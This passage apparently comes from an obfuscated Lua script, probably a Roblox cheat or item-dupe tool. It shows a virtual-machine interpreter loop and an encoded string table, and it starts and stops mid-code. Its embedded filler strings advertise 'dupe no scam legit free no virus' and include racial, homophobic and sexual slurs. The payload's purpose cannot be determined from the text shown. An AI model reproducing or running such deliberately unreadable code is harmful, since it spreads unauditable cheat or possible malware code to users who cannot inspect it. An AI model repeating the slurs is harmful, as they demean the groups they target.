a;l[e[r]]=y[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[O]][e[U]]=e[D];o=o+d;e=n[o];l[e[w]]=y[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[x]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[b]][e[h]]=e[_];o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];a=e[O];C=l[e[U]];l[a+1]=C;l[a]=C[e[D]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];a=e[x];C=l[e[k]];l[a+1]=C;l[a]=C[e[_]];o=o+d;e=n[o];a=e[x]P,B=m(l[a](l[a+S]))g=B+a-d i=0;for e=a,g do i=i+d;l[e]=P[i];end;o=o+d;e=n[o];a=e[x]P={l[a](s(l,a+1,g))};i=0;for e=a,e[M]do i=i+d;l[e]=P[i];end o=o+d;e=n[o];o=e[h];break;end while(a)/((0x14b68/105))==1007 do a=(7261281)while(-0x5f+222)<C do a-= a local d=e[O];local n=l[d]local a=l[d+2];if(a>0)then if(n>l[d+1])then o=e[c];else l[d+3]=n;end elseif(n<l[d+1])then o=e[c];else l[d+3]=n;end break end while 3741==(a)/((135870/0x46))do local a;l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[w]]=l[e[u]];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();break end;break;end break;end break;end while 3637==(a)/(((247228/0x4c)+-#'testpsx dupe no scam legit 2022 free no virus'))do a=(201780)while(0x175-243)>=C do a-= a a=(2939640)while((412-0x107)+-#'Cock and ball tortue')<C do a-= a local x;local a;l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[w]]=y[e[c]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[B]];o=o+d;e=n[o];a=e[r];x=l[e[U]];l[a+1]=x;l[a]=x[e[D]];break end while(a)/((-#'W4rboy was here'+(0x2bdbf/169)))==2805 do local a;local k;local B,p;local C;local a;l[e[i]]=y[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[O]][e[t]]=e[M];o=o+d;e=n[o];l[e[x]]=y[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[O]][e[U]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];a=e[b];C=l[e[c]];l[a+1]=C;l[a]=C[e[N]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];a=e[i];C=l[e[U]];l[a+1]=C;l[a]=C[e[_]];o=o+d;e=n[o];a=e[r]B,p=m(l[a](l[a+S]))g=p+a-d k=0;for e=a,g do k=k+d;l[e]=B[k];end;o=o+d;e=n[o];a=e[w]B={l[a](s(l,a+1,g))};k=0;for e=a,e[M]do k=k+d;l[e]=B[k];end o=o+d;e=n[o];o=e[u];break end;break;end while 1140==(a)/((((681-0x167)+-0x64)+-#"testpsx dupe no scam legit 2022 free no virus"))do a=(6997432)while(27510/0xd2)>=C do a-= a l[e[w]][e[k]]=e[_];break;end while 3172==(a)/((297810/0x87))do a=(9285549)while(-#'if syn then haxor alert end'+((0x155+-100)+-82))<C do a-= a local d=e[b];local n=l[d]local a=l[d+2];if(a>0)then if(n>l[d+1])then o=e[c];else l[d+3]=n;end elseif(n<l[d+1])then o=e[k];else l[d+3]=n;end break end while(a)/((-107+0xfb4))==2373 do local e=e[x]local n,o=m(l[e](s(l,e+d,g)))g=o+e-S local o=0;for e=e,g do o=o+d;l[e]=n[o];end;break end;break;end break;end break;end break;end break;end while(a)/((0x49f+-113))==3261 do a=(8131495)while C<=(23309/0xa3)do a-= a a=(1933179)while C<=(0x413a/121)do a-= a a=(4369125)while((22197/0x93)+-#"cruz pp is large")>=C do a-= a a=(4346760)while(-#[[holy shit]]+(336-0xc1))<C do a-= a local e=e[i]l[e]=l[e](l[e+S])break end while(a)/(((0x1764-3035)+-#'0nly was here mf'))==1480 do local e=e[w]local n,o=m(l[e](l[e+S]))g=o+e-d local o=0;for e=e,g do o=o+d;l[e]=n[o];end;break end;break;end while(a)/((-#"yeet"+(212531/(-0x74+255))))==2865 do a=(515648)while C<=(346-0xd2)do a-= a local C;local a;l[e[x]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[M]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]][e[c]]=e[P];o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[D]];o=o+d;e=n[o];a=e[w];C=l[e[c]];l[a+1]=C;l[a]=C[e[N]];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[N]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[D]];o=o+d;e=n[o];l[e[w]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[u]]=e[P];o=o+d;e=n[o];l[e[r]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[h]]=l[e[M]];o=o+d;e=n[o];l[e[w]][e[u]]=e[_];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[w]]=e[k];break;end while 224==(a)/((-#"Nsrds GAYYYYAIAHAKAJAVAHAUA"+(0x94e+-53)))do a=(12506598)while(0x55a0/((445-0x10e)+-#[[howtodumpscript]]))<C do a-= a local a;l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[b]]=l[e[u]];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[w]]();break end while 3783==(a)/((0x1a3a-3408))do local x;local a;l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[r]]=y[e[k]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[D]];o=o+d;e=n[o];a=e[O];x=l[e[k]];l[a+1]=x;l[a]=x[e[N]];break end;break;end break;end break;end while(a)/((-0x77+1040))==2099 do a=(1361230)while((27375/0x4b)-225)>=C do a-= a a=(6587815)while(0x116/2)<C do a-= a f[e[t]]=l[e[i]];break end while 2795==(a)/((0x12ce-2457))do local o=e[O];local d=l[e[c]];l[o+1]=d;l[o]=d[e[M]];break end;break;end while 566==(a)/((-#"papier ist ein kleiner schwanz lutscher"+(0x893c8/230)))do a=(12630912)while(-#"atakan der nigga"+(0x181-228))>=C do a-= a local a;a=e[r]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[x]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[w]][e[h]]=e[P];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[M]];o=o+d;e=n[o];l[e[b]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[x]][e[c]]=e[M];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[N]];o=o+d;e=n[o];l[e[x]][e[h]]=e[B];o=o+d;e=n[o];l[e[b]][e[k]]=e[M];o=o+d;e=n[o];l[e[i]][e[h]]=e[M];o=o+d;e=n[o];l[e[x]][e[u]]=e[D];o=o+d;e=n[o];l[e[O]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[U]][e[N]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[b]][e[k]]=e[D];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[x]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[h]]=e[B];o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[P]];o=o+d;e=n[o];l[e[w]]=f[e[U]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[O]][e[c]]=e[B];o=o+d;e=n[o];l[e[r]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[U]]=l[e[P]];o=o+d;e=n[o];l[e[b]][e[t]]=e[D];o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[k]][e[M]];break;end while 4064==(a)/((3216+-0x6c))do a=(3380841)while C>(-#"nerd"+((-#"this is a meme string"+(17996/0x2c))-0xf2))do a-= a l[e[r]]=f[e[u]];break end while(a)/((-#"anime is for fags"+((4074-0x811)-1023)))==3489 do local a;l[e[i]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[w]][e[t]]=e[D];o=o+d;e=n[o];l[e[b]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[b]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[k]]=e[_];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]][e[k]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[u]]=e[P];o=o+d;e=n[o];l[e[i]][e[c]]=e[M];o=o+d;e=n[o];l[e[b]][e[h]]=e[P];o=o+d;e=n[o];l[e[i]][e[c]]=e[P];o=o+d;e=n[o];l[e[r]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[N]];o=o+d;e=n[o];l[e[r]][e[k]]=e[N];o=o+d;e=n[o];l[e[w]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[w]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[x]][e[c]]=e[P];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[h]]=e[N];o=o+d;e=n[o];l[e[w]][e[c]]=e[B];o=o+d;e=n[o];l[e[O]][e[k]]=e[_];o=o+d;e=n[o];l[e[i]][e[h]]=e[_];o=o+d;e=n[o];l[e[r]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[U]][e[M]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[r]]=e[c];break end;break;end break;end break;end break;end while 3635==(a)/((-46+0x8eb))do a=(1481006)while((0x6ea0/177)+-#"deadphonelua")>=C do a-= a a=(2466200)while(345-(0x1b0-232))>=C do a-= a a=(4992240)while C>(182+(0x23+-73))do a-= a local o=e[b]local n,e=m(l[o](s(l,o+1,e[k])))g=e+o-1 local e=0;for o=o,g do e=e+d;l[o]=n[e];end;break end while(a)/((0xfda+-32))==1240 do l[e[b]]=(e[h]~=0);break end;break;end while 760==(a)/((6575-0xd02))do a=(8083764)while(0x832c/230)>=C do a-= a local o=e[b]l[o](s(l,o+S,e[U]))break;end while 3004==(a)/((5473-0xade))do a=(16240000)while C>(-126+(-#'atakan der nigga'+(0x2bf-414)))do a-= a local a;l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[b]]=l[e[k]];o=o+d;e=n[o];a=e[r]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]();o=o+d;e=n[o];do return end;break end while(a)/((((0x79b06d4/217)+-#"impulse was here omg")/147))==4060 do local a;l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[w]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[O]][e[u]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[t]]=l[e[B]];o=o+d;e=n[o];l[e[r]][e[U]]=e[B];o=o+d;e=n[o];l[e[b]][e[h]]=e[P];o=o+d;e=n[o];l[e[i]][e[k]]=e[N];o=o+d;e=n[o];l[e[i]][e[h]]=e[M];o=o+d;e=n[o];l[e[O]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[O]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[O]][e[U]]=e[M];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[b]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[O]][e[h]]=e[P];o=o+d;e=n[o];l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[u]]=e[_];o=o+d;e=n[o];l[e[r]][e[u]]=e[_];o=o+d;e=n[o];l[e[x]][e[k]]=e[M];o=o+d;e=n[o];l[e[w]][e[c]]=e[B];o=o+d;e=n[o];l[e[i]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[U]];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[k]))break end;break;end break;end break;end while(a)/((-115+0x85d))==731 do a=(8220240)while C<=(-0x39+207)do a-= a a=(1419556)while(-#"Lana Rhoades"+(-0x47+(-0x61+329)))<C do a-= a do return l[e[b]]end break end while 3868==(a)/((-#[[lego hax]]+(-123+0x1f2)))do local w;local a;l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[i]]=y[e[u]];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[b]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[B]];o=o+d;e=n[o];a=e[r];w=l[e[t]];l[a+1]=w;l[a]=w[e[D]];break end;break;end while 2520==(a)/((0x1994-3286))do a=(5979816)while(-0x29+192)>=C do a-= a l[e[x]]=l[e[U]]%e[M];break;end while(a)/((385848/0xe9))==3611 do a=(464446)while(0x176-222)<C do a-= a l[e[b]]={};break end while 362==(a)/((0xa4b-1352))do local d=e[h];local o=l[d]for e=d+1,e[N]do o=o..l[e];end;l[e[x]]=o;break end;break;end break;end break;end break;end break;end break;end break;end o+= S end;end);end;return A(Y(),{},W())()end)_msec({[(-110+0x11e)]='\115\116'..(function(e)return(e and'㒛㒥㒦㒙㒣㒣㒡㒣㒠㒤㒡㒝㒡')or'\114\105'or'\120\58'end)((0x3d-56)==(-#"lego hax"+(3486/0xf9)))..'\110g',["㒜㒡㒜㒗㒟㒞㒙㒢㒝㒙㒟㒚㒥㒗㒞㒡㒡㒞"]='\108\100'..(function(e)return(e and'㒡㒠㒙㒤㒘㒛㒛㒠㒣㒟㒟㒢㒛㒘㒘㒠')or'\101\120'or'\119\111'end)((51+-0x2e)==(-#'0nly was here mf'+(-0x74+138)))..'\112',["㒙㒘㒣㒙㒣㒢㒙㒡㒜㒣㒛㒙㒢"]=(function(e)return(e and'㒚㒘㒦㒡㒤㒛㒝㒟㒣㒟')and'\98\121'or'\100\120'end)((540/0x6c)==((2877/0x89)+-#"0nly was here mf"))..'\116\101',["㒝㒣㒝㒢㒠㒙㒡㒚"]='\99'..(function(e)return(e and'㒟㒣㒜㒢㒡㒦㒠㒟㒠㒗㒗㒘㒥㒦㒦㒥㒤㒞㒝')and'\90\19\157'or'\104\97'end)(((0x3f7/35)+-#[[fatee is gay 0nly on top]])==((-45+0x37)+-#[[elbicho]]))..'\114',[(1146-0x25a)]='\116\97'..(function(e)return(e and'㒥㒟㒟㒜㒦㒡㒝㒠㒝㒦')and'\64\113'or'\98\108'end)((101-0x5f)==((((-1089/0xb)+-#'Negro')+118)+-#'0nly segc'))..'\101',["㒟㒡㒟㒣㒣㒣㒠㒤㒛㒤㒦㒙㒡㒘"]=(function(e)return(e and'㒝㒗㒙㒗㒤㒝㒟㒤㒢㒚㒢㒤')or'\115\117'or'\78\107'end)(((-18+0x30)+-#'if syn then haxor alert end')==(-#"bigchungus"+(183-0x8e)))..'\98',["㒜㒝㒠㒞㒚㒜㒗㒥㒟㒤㒗㒥㒛㒗㒘㒜㒝"]='\99\111'..(function(e)return(e and'㒟㒡㒝㒜㒘㒜㒟㒛㒜㒝㒥㒡㒡㒦㒠㒛㒦㒛')and'\110\99'or'\110\105\103\97'end)((0x4c+-45)==(-#[[papier der afghaner wurde von nice dem bombenleger 